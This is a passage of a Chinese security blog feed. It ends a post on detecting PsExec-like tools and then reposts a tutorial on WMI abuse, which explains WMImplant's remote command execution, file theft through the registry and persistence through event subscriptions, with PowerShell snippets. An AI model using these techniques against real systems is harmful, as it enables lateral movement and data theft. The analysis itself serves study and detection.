(QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&amp;routineName)<span class="comment">;</span></div><div class="line">ntStatus = ZwQueryInformationProcess(*ProcessHandle, <span class="number">0</span>, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL)<span class="comment">;</span></div><div class="line">if (!ntStatus)</div><div class="line">&#123;</div><div class="line">upPid = pbi.InheritedFromUniqueProcessId<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来，就可以判断返回的Pid的进程是否是服务，这一步，网上也有现成的代码。具体来说，就是通过EnumServicesStatusEx函数获取整个服务列表的LPENUM_SERVICE_STATUS_PROCESS，而LPENUM_SERVICE_STATUS_PROCESS保存着对于进程的Pid。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> IsServicesByPid(DWORD dwPid)</div><div class="line">&#123;</div><div class="line">SC_HANDLE hSCM = <span class="literal">NULL</span>;</div><div class="line">hSCM = OpenSCManager(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);</div><div class="line"><span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] OpenSCManager:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD dwBufSize = <span class="number">0</span>;                <span class="comment">// 传入的缓冲长度</span></div><div class="line">DWORD dwBufNeed = <span class="number">0</span>;                <span class="comment">// 需要的缓冲长度</span></div><div class="line">DWORD dwNumberOfService = <span class="number">0</span>;        <span class="comment">// 返回的服务个数</span></div><div class="line">EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,</div><div class="line"><span class="literal">NULL</span>, dwBufSize, &amp;dwBufNeed, &amp;dwNumberOfService, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">char</span> *pBuf = <span class="literal">NULL</span>;</div><div class="line">dwBufSize = dwBufNeed + <span class="keyword">sizeof</span>(ENUM_SERVICE_STATUS_PROCESS);</div><div class="line">pBuf = (<span class="keyword">char</span> *)malloc(dwBufSize);</div><div class="line">memset(pBuf, <span class="number">0</span>, dwBufSize);</div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> bRet = <span class="literal">FALSE</span>;</div><div class="line">bRet = EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,</div><div class="line">(LPBYTE)pBuf, dwBufSize, &amp;dwBufNeed, &amp;dwNumberOfService, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (bRet == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">" EnumServicesStatusEx %d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">LPENUM_SERVICE_STATUS_PROCESS pServiceInfo = (LPENUM_SERVICE_STATUS_PROCESS)pBuf;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwNumberOfService; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (dwPid == pServiceInfo[i].ServiceStatusProcess.dwProcessId)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]Find Service Name %s Of ProcessId"</span>, pServiceInfo[i].lpDisplayName);</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来，就是判断PsExecSvc.exe是否具有命名管道，命名管道实际上就是Type为”File”的句柄，所以，只需要遍历进程的句柄表，然后检查句柄类型为File，且句柄名称带有NamedPipe的，就是存在命名管道。可以使用Process Explorer来搜索命名管道。<br>    <img src="http://hacky.wang/blog/20210718/CGN9Yw6CHLow.png?imageslim" alt="mark"></p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//获取句柄名</span></div><div class="line">Status = ZwQueryObject((HANDLE)hDuplicate,</div><div class="line">ObjectNameInformation,</div><div class="line">BufferForObjectName,</div><div class="line">sizeof(BufferForObjectName),</div><div class="line"><span class="keyword">NULL</span>);</div><div class="line"></div><div class="line">ObjectName = (POBJECT_NAME_INFORMATION)BufferForObjectName;</div><div class="line"><span class="keyword">if</span> (Status == STATUS_INFO_LENGTH_MISMATCH || !NT_SUCCESS(Status))</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">PWCHAR HandleType_File = L<span class="string">"File"</span>;</div><div class="line"><span class="keyword">CHAR</span> cObjectName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="keyword">if</span> (wcscmp((PWCHAR)ObjectType-&gt;TypeName.Buffer, HandleType_File) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">wsprintfA(cObjectName, <span class="string">"%S"</span>, (PWCHAR)ObjectName-&gt;Name.Buffer);</div><div class="line"><span class="keyword">if</span> (strstr(cObjectName, <span class="string">"\\Device\\NamedPipe"</span>))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]Type:%ls|Name:%ls|Handle:%X\n"</span>, ObjectType-&gt;TypeName.Buffer, ObjectName-&gt;Name.Buffer, (DWORD)dwHandle);</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只需要将获取的Pid传到R3，然后检查服务和命名管道符合这三个维度就可以基本判断其可能是PsExec类似软件。<br>     <img src="http://hacky.wang/blog/20210718/qR7Vz1t6fHlR.jpg?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210718/mfe3BtJLzqCl.jpg?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210718/P3Hz7Bu2vf9J.jpg?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-前言&quot;&gt;&lt;a href=&quot;#0x1-前言&quot; class=&quot;headerlink&quot; title=&quot;0x1 前言&quot;&gt;&lt;/a&gt;0x1 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本文主要通过逆向分析的方法分析PsExec的技术实现和有关PsExec和类PsExec工具的检测方法，当然其中也会掺杂一些乱七八糟的点，都是学习PsExec的一些总结。本文行文仓促，如有错误，请各位积极指正。&lt;/p&gt;
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="https://findream.github.io/categories/ATT-CK/"/>
    
    
  </entry>
  
  <entry>
    <title>WMI的攻守之道</title>
    <link href="https://findream.github.io/2021/11/13/WMI%E6%94%BB%E5%AE%88%E4%B9%8B%E9%81%93/"/>
    <id>https://findream.github.io/2021/11/13/WMI攻守之道/</id>
    <published>2021-11-13T07:02:11.000Z</published>
    <updated>2022-09-14T13:16:03.750Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转载于跳跳糖安全社区，原文链接为<a href="https://tttang.com/archive/1624/" target="_blank" rel="external">https://tttang.com/archive/1624/</a></li></ul><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows Management Instrumentation(Windows 管理规范) 即WMI，是微软实现的基于Web的企业管理(WBEM)。WMI使用通用信息模型(CIM)来表示系统、应用程序、网络、设备和其他托管组件。WMI支持本地和远程访问。WMI底层基于分布式组件对象模型(DCOM)或者Windows远程管理(WinRM)。程序员们可以使用脚本语言(例如powershell)，或者C++，通过COM技术与WMI进行交互。本文行文仓促，如有错误，请各位积极指正。</p><h2 id="0x01-WMI滥用情况"><a href="#0x01-WMI滥用情况" class="headerlink" title="0x01 WMI滥用情况"></a>0x01 WMI滥用情况</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于WMI的特殊性，WMI可以被广泛的滥用于MITER ATT&amp;CK矩阵中，包括执行，持久化，防御逃避，侦查，横向移动，命令控制。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[执行]战术中，ATT&amp;CK专门安排了一个技术点专门介绍Windows行为规范T1047。WMI可以通过命令和脚本解释器powershell（T1059.001）进行交互，并且其通信是基于对象组件模型(T1559.001)。并且可以通过Win32_ScheduledJob类创建计划任务(T1053),但这已经不能在Win7以上系统中使用了。<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_ScheduledJob</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[持久化]战术中，可以通过WMI事件订阅(T1546.003)安装筛选器和事件消费者实现持久化。WMI具有远程连接的能力，即外部远程服务(T1133)。并且可以通过注册表在Run键下面创建启动项(T1547.001)<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Set</span>-WmiInstance -Namespace root\subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Arguments <span class="built_in">$FilterToConsumerArgs</span></div><div class="line">Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">Class</span> StdRegProv -Name CreateKey</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[防御逃避]中，可以利用WMI通过修改注册表(T1112)的方式禁用或修改工具(T1562.001)，也可以通过Win32_Process类间接创建进程，通过WMI创建的进行其父进程应该为WMI提供者进程(T1202)。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Invoke-WmiMethod -<span class="keyword">Class</span> Win32_Process -EnableAllPrivileges -Impersonation <span class="number">3</span> -Authentication Packetprivacy -<span class="keyword">Name</span> Create</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[侦查]中，可以获取系统各方面的信息，可以利用Win32_UserAccount,Win32_LoggedOnUser获取账户信息(T1087)。使用Win32_Directory类获取文件信息(T1083)。使用Win32_Process类获取进程信息(T1057),使用Win32_OperatingSystem，Win32_SystemResourcesetc类进行系统信息侦查(T1082)等等<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_UserAccount</span></span></div><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_Process</span></span></div><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_Service</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI主要通过Win_Process进行远程命令执行。</p><h2 id="0x02-WMI的工作原理"><a href="#0x02-WMI的工作原理" class="headerlink" title="0x02 WMI的工作原理"></a>0x02 WMI的工作原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据windows在<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture" target="_blank" rel="external">WMI 架构</a>知识文档中所述，WMI架构主要包括3个部分，WMI消费者，WMI基础架构，WMI提供者和托管对象。<br>    <img src="http://hacky.wang/blog/20211113/P0UyPjN9vcbt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI提供者(WMI Provider)是一个COM对象，负责管理和监视托管对象，向托管对象处发起请求，并其中获取数据，并将数据提供给WMI基础架构。所以称之为提供者(Provider)。托管对象是一个逻辑或者物理的组件，例如进程，操作系统，服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI基础架构(WMI infrastructure)是一个Windows系统组件，称为WMI服务(winmgnt),WMI基础结构有两个组件：CIM对象管理器和WMI存储库。WMI存储库存储着一些静态数据。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI消费者是和WMI基础架构进行交互的管理程序或者脚本。WMI消费者通过相关的COM API或者脚本API与WMI基础架构进行交互，用来查询，枚举数据，运行管理程序方法或订阅事件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简单概括WMI工作原理就是WMI消费者通过统一的API接口与WMI基础架构进行交互，由WMI基础架构充当WMI消费者，和WMI提供者，WMI存储库之间的中介。如果需要获取的是静态数据，则直接从存储库获取，如果是动态数据，则可以通过WMI提供者获取数据。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI既可以执行本地操作，也可以执行远程操作，这也是攻击者喜欢使用WMI的原因之一，WMI主要支持两种协议，DCOM和WinRM。最开始DCOM协议是WMI使用的默认协议，DCOM又称分布式组件对象模型，其通过135端口建立连接。而后续的WMI中，微软推荐使用WinRM协议进行通信。本次，本文主要通过powershell描述WMI攻击方式。所以重点也将关注DCOM协议。因为powershell内置的WMI命令是使用DCOM协议。</p><h2 id="0x03-WMI攻击"><a href="#0x03-WMI攻击" class="headerlink" title="0x03 WMI攻击"></a>0x03 WMI攻击</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows提供了多种和WMI进行交互的方式，例如通过powershell或者VBScript等脚本语言进行交互，比如利用c++通过COM API进行交互，利用C#，通过System.Management命名空间下的几个类和WMI进行交互，除此以外，还有几款成熟的工具用来和WMI进行交互，例如wmic.exe。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文将以WMImplant为例，介绍WMI攻击的原理。WMImplant是一个基于PowerShell的工具，它利用WMI来对目标机器执行操作，而且还作为C2通道来发出命令和接收结果。WMImplant的主要功能有文件操作，横向移动，进程操作，系统操作，以及日志操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PowerShell有很多和WMI交互的函数，WMImplant使用的函数主要有如下几个函数。当然，WMImplant使用这些WMI函数，并没有使用CIM函数，因为函数命令是基于低版本的Powershell，而CIM函数只能用于V3以上的版本，但是CIM函数能支持DCOM协议和WinRM协议，而WMI函数只支持DCOM协议。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Get-WmiObject</span></div><div class="line"><span class="built_in">Set-WmiInstance</span></div><div class="line"><span class="built_in">Invoke-WmiMethod</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMImplant用法很简单,只需要知道目标及其的ComputerName，以及管理员Credential。使用<code>Import-Module .\WMImplant.ps1</code>和<code>Invoke-WMImplant</code>两条命令启动WMImplant。<br>   <img src="http://hacky.wang/blog/20211114/Fb2RO4pHdxuJ.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后使用<code>change_user</code>命令设置domain/user和password。<br>   <img src="http://hacky.wang/blog/20211114/XHHNo9dOvt29.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMImplant的文件操作主要有一下操作，其中，经常使用的有<code>cat</code>命令,<code>download</code>命令,<code>ls</code>命令,<code>upload</code>命令。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat                                 -   Reads <span class="keyword">the</span> contents <span class="keyword">of</span> <span class="keyword">a</span> <span class="built_in">file</span></div><div class="line">copy                                -   Copies <span class="keyword">a</span> <span class="built_in">file</span> <span class="built_in">from</span> <span class="literal">one</span> location <span class="built_in">to</span> another</div><div class="line">download                            -   Download <span class="keyword">a</span> <span class="built_in">file</span> <span class="built_in">from</span> <span class="keyword">the</span> targeted machine</div><div class="line">ls                                  -   File/Directory listing <span class="keyword">of</span> <span class="keyword">a</span> specific <span class="built_in">directory</span></div><div class="line">search                              -   Search <span class="keyword">for</span> <span class="keyword">a</span> <span class="built_in">file</span> <span class="keyword">on</span> <span class="title">a</span> <span class="title">user-specified</span> <span class="title">drive</span></div><div class="line">upload                              -   Upload <span class="keyword">a</span> <span class="built_in">file</span> <span class="built_in">to</span> <span class="keyword">the</span> targeted machine</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ls命令的主要作用是列举指定目录下的目录和文件，依次指定指定的ComputerName和目录。其基本原理是从Win32_Directory类中获取目录的信息。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">filter = <span class="string">"Drive='<span class="variable">$Drive</span>' and Path='<span class="variable">$DirPath</span>'"</span></span></div><div class="line"><span class="meta">$</span><span class="bash">a= Get-WmiObject -Class Win32_Directory -Filter <span class="variable">$filter</span></span></div></pre></td></tr></table></figure></p><p><img src="http://hacky.wang/blog/20211114/cJyxcHzGtCy5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而cat命令的作用是读取文件内容，但是WMI本身是不具有回显的功能，通常有两种情况解决WMI回显的问题，第一种是将回显结果写入文件，然后通过SMB读取文件，但是因为使用了SMB协议，所以会额外多添加一个445端口。第二种方法是将回显结果写入注册表，然后通过WMI相关注册表操作函数读取注册表的内容，从而实现回显。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMImplant也是通过远程创建进程将结果写入注册表的方式实现回显，具体操作如下,首先利用StdRegProv类的CreateKey方法创建一个注册表项。<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$reg</span>_create =  Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">Class</span> StdRegProv -Name CreateKey -ArgumentList <span class="built_in">$HKCU</span>, <span class="built_in">$Item</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后构造一个远程命令,其主要目的是利用<code>Get-Content</code>函数读取文件内容，然后将其编码，之后利用<code>Set-ItemProperty</code>函数将其写入注册表中。<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$remote_command</span> = <span class="string">'<span class="variable">$fct</span> = Get-Content -Encoding byte -Path '</span><span class="string">''</span> + <span class="string">"<span class="variable">$File</span>"</span> + <span class="string">''</span><span class="string">'; <span class="variable">$fctenc</span> = [Int[]][Char[]]<span class="variable">$fct</span> -Join '</span><span class="string">','</span><span class="string">'; Set-ItemProperty -Path HKCU:\SOFTWARE\EvilKey -Name Result  -Value <span class="variable">$fctenc</span>;'</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>Invoke-WMIObfuscatedPSCommand</code>函数执行上述远程命令。Invoke-WMIObfuscatedPSCommand函数主要是基于利用Win32_Proces类的Create方法创建进程从而执行远程命令。<br>   <img src="http://hacky.wang/blog/20211114/A1xhca343OIb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后便是利用<code>StdRegProv</code>类的<code>GetStringValue</code>读取键的值。<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regvalue</span> = Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">class</span> StdRegProv -Name GetStringValue  -ArgumentList <span class="built_in">$HKCU</span>, <span class="built_in">$KeyPath</span>, <span class="built_in">$ResultKey</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>download</code>命令和<code>upload</code>命令的原理是一样的，都是借助注册表保存文件的内容。然后利用Set-Content函数将保存在注册表的内容写入文件。只是<code>download命令</code>是在本地执行Set-Content函数。而<code>upload</code>命令是在远程机器执行Set-Content函数。<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//upload远程执行Set-Content函数</div><div class="line"><span class="variable">$remote_command</span> = <span class="string">'<span class="variable">$Hive</span> = 2147483650; <span class="variable">$key</span> = '</span><span class="string">''</span> + <span class="string">"<span class="variable">$regpath</span>'"</span> + <span class="string">'; <span class="variable">$value</span> = '</span><span class="string">''</span> + <span class="string">"<span class="variable">$registryupname</span>"</span> + <span class="string">''</span><span class="string">'; <span class="variable">$out</span> = Invoke-WmiMethod -Namespace '</span><span class="string">'root\default'</span><span class="string">' -Class '</span><span class="string">'StdRegProv'</span><span class="string">' -Name '</span><span class="string">'GetStringValue'</span><span class="string">' -ArgumentList <span class="variable">$Hive</span>, <span class="variable">$key</span>, <span class="variable">$value</span>; <span class="variable">$decode</span> = [byte[]][int[]]<span class="variable">$out</span>.sValue.Split('</span><span class="string">','</span><span class="string">') -Join '</span><span class="string">' '</span><span class="string">'; [byte[]] <span class="variable">$decoded</span> = <span class="variable">$decode</span> -split '</span><span class="string">' '</span><span class="string">'; Set-Content -Encoding byte -Path '</span> + <span class="string">"<span class="variable">$Upload_Dir</span>"</span> + <span class="string">' -Value <span class="variable">$decoded</span>; Remove-ItemProperty -Path '</span> + <span class="string">"'<span class="variable">$fullregistrypath</span>'"</span> + <span class="string">' -Name '</span> + <span class="string">"'<span class="variable">$registryupname</span>'"</span></div><div class="line">//download本地执行Set-Content函数</div><div class="line">Set-Content -Encoding byte -Path <span class="variable">$Download_file_path</span> -Value <span class="variable">$decoded</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据WMImplant的介绍，横向移动有如下命令,其中经常使用的是command_exec。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">command_exec                        -   <span class="builtin-name">Run</span> a command line command <span class="keyword">and</span> receive the output</div><div class="line">disable_wdigest                     -   Removes registry value UseLogonCredential</div><div class="line">disable_winrm                       -   Disables WinRM on the targeted system</div><div class="line">enable_wdigest                      -   Adds registry value UseLogonCredential</div><div class="line">enable_winrm                        -   Enables WinRM on the targeted system</div><div class="line">registry_mod                        -   Modify the registry on the targeted machine</div><div class="line">remote_posh                         -   <span class="builtin-name">Run</span> a PowerShell<span class="built_in"> script </span>on a remote machine <span class="keyword">and</span> receive the output</div><div class="line">sched_job                           -   Manipulate scheduled jobs</div><div class="line">service_mod                         -   Create, delete, <span class="keyword">or</span> modify<span class="built_in"> system </span>services</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Invoke-WMIObfuscatedPSCommand</code>函数简单的介绍过，其底层就是使用Win32_Process类的Create方法实现的。剩下就是构造一个远程命令,这个命令主要就是利用 Invoke-Command的<code>-sc</code>参数。<code>-sc</code>参数可以添加一个代码块。这样就可以执行Powershell代码块。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">remote_command = <span class="string">"powershell `<span class="variable">$command1</span> =  &#123;<span class="variable">$ExecCommand</span>&#125;; `<span class="variable">$command2</span> = Invoke-Command -sc `<span class="variable">$command1</span> | Out-String; Set-ItemProperty -Path HKCU:\SOFTWARE\EvilKey -Name Result  -Value `<span class="variable">$command2</span>"</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外,powershell自带-Command参数，也可以添加代码块，还可以进行加密。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">remote_command = <span class="string">"powershell.exe powershell -Command &#123;<span class="variable">$command</span>&#125;"</span></span></div><div class="line"><span class="meta">$</span><span class="bash">bytes = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$command</span>)</span></div><div class="line"><span class="meta">$</span><span class="bash">encodedCommand = [Convert]::ToBase64String(<span class="variable">$bytes</span>)</span></div><div class="line"><span class="meta">$</span><span class="bash">process = Invoke-WmiMethod -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist <span class="variable">$remote_command</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假如需要利用powershell在远程机器创建一个文件，需要使用到如下代码块。使用WMImplant远程执行，效果如下。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$filepath</span> =<span class="string">'C:\BaiduNetdiskDownload\123.txt'</span>;</div><div class="line">New-Item <span class="variable">$filepath</span> -<span class="built_in">type</span> file<span class="string">"</span></div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20211114/5eU1GFiefImT.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211114/3oCtYnVTLq49.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然，也许，你不需要执行一个代码块，仅仅需要执行一个<code>whoami命令</code>。command_exec命令也是可以胜任的。<br>   <img src="http://hacky.wang/blog/20211114/8zFqzgBYgw0D.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211114/5wp3jz3GejPd.png?imageslim" alt="mark"></p><h2 id="0x04-WMI事件订阅机制"><a href="#0x04-WMI事件订阅机制" class="headerlink" title="0x04 WMI事件订阅机制"></a>0x04 WMI事件订阅机制</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI事件分为两类，本地事件订阅和永久性事件订阅。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本地事件订阅的生命周期是进程生命周期，而永久性事件订阅可以在任何事件接收WMI事件，其保存在WMI存储库中，永久性事件订阅使用一组永久的过滤器捕获WMI事件，即事件筛选器(Event Filter)，一个永久的事件消费者(Event Constumer),以及两者之间的绑定关系。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;事件筛选器是一个__EventFilter类，用于描述WMI将哪些事件传递给事件消费者，即通过WQL语句筛选出触发事件消费者的条件。事件过滤器可以指定内部或外部事件；并且过滤器可以引用源自命名空间的事件。事件筛选器包括四个参数EventNamespace(事件命名空间)，Name(筛选器名称),Query(筛选过滤语句),QueryLanguage(语句类型)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">EventNamespace = 'root/cimv2'</div><div class="line">Name = $FilterName</div><div class="line">Query = $Query</div><div class="line">QueryLanguage = 'WQL'</div><div class="line">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments 